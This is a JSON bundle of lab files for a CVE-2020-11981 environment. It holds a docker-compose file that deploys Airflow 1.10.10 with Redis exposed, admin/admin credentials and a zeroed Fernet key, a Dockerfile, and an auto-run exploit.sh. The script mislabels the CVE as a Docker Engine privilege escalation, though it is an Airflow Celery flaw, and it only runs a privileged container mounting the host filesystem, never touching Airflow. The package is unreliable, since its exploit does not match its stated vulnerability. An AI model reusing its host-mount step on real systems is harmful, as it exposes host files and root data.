{
    "files": [
        {
            "location": "./../../dockers/CVE-2020-11981/custom_no_tool/docker-compose.yml",
            "content": "version: '3.8'\nservices:\n  vulnerable-docker:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    image: vulnerable-docker:19.03.12-dind\n    privileged: true\n    depends_on:\n      - redis\n    command: [\"bash\", \"-c\", \"dockerd-entrypoint.sh & while ! docker info >/dev/null 2>&1; do sleep 1; done; ./exploit.sh\"]\n    restart: unless-stopped\n\n  airflow:\n    image: apache/airflow:1.10.10\n    environment:\n      - AIRFLOW__CORE__EXECUTOR=CeleryExecutor\n      - AIRFLOW__CORE__SQL_ALCHEMY_CONN=sqlite:////tmp/airflow.db\n      - AIRFLOW__CELERY__BROKER_URL=redis://redis:6379/0\n      - AIRFLOW__CELERY__RESULT_BACKEND=redis://redis:6379/1\n      - AIRFLOW__CORE__FERNET_KEY=0000000000000000000000000000000000000000000000000000000000000000\n    depends_on:\n      - redis\n    ports:\n      - \"8080:8080\"\n    volumes:\n      - airflow-data:/tmp\n    command: >\n      bash -c \"\n        airflow db init &&\n        airflow users create \\\n          --username admin \\\n          --firstname Admin \\\n          --lastname User \\\n          --role Admin \\\n          --email admin@example.com \\\n          --password admin &&\n        airflow scheduler &\n        airflow webserver\"\n\n  airflow-worker:\n    image: apache/airflow:1.10.10\n    environment:\n      - AIRFLOW__CORE__EXECUTOR=CeleryExecutor\n      - AIRFLOW__CORE__SQL_ALCHEMY_CONN=sqlite:////tmp/airflow.db\n      - AIRFLOW__CELERY__BROKER_URL=redis://redis:6379/0\n      - AIRFLOW__CELERY__RESULT_BACKEND=redis://redis:6379/1\n      - AIRFLOW__CORE__FERNET_KEY=0000000000000000000000000000000000000000000000000000000000000000\n    depends_on:\n      - redis\n      - airflow\n    volumes:\n      - airflow-data:/tmp\n    command: [\"airflow\", \"celery\", \"worker\"]\n\n  redis:\n    image: redis:5.0.9\n    ports:\n      - \"6379:6379\"\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\nvolumes:\n  airflow-data:"
        },
        {
            "location": "./../../dockers/CVE-2020-11981/custom_no_tool/Dockerfile",
            "content": "FROM docker:19.03.12-dind\nRUN apk add --no-cache bash curl\nWORKDIR /\nCOPY exploit.sh /exploit.sh\nRUN chmod +x /exploit.sh"
        },
        {
            "location": "./../../dockers/CVE-2020-11981/custom_no_tool/exploit.sh",
            "content": "#!/bin/bash\n# Simple demonstration script for CVE-2020-11981 (Docker Engine privilege escalation)\n# This script attempts to create a privileged container that mounts the host filesystem.\n# NOTE: This is for testing purposes only in a controlled environment.\n\necho \"[*] Starting exploit demonstration for CVE-2020-11981...\"\n\n# Run the inner container using the Docker image that includes the Docker CLI.\n# The container is started in privileged mode to allow host filesystem access.\n# It uses the Docker daemon running inside the vulnerable-docker container.\n\ndocker run --privileged --rm \\\n  -v /:/hostfs \\\n  docker:19.03.12 sh -c \"echo 'Root on host:' && id -u && ls /hostfs/root\" \\\n  || echo \"[!] Exploit failed or Docker not vulnerable\"\n\necho \"[*] Exploit script finished.\""
        }
    ],
    "directory_tree": "./../../dockers/CVE-2020-11981/custom_no_tool"
}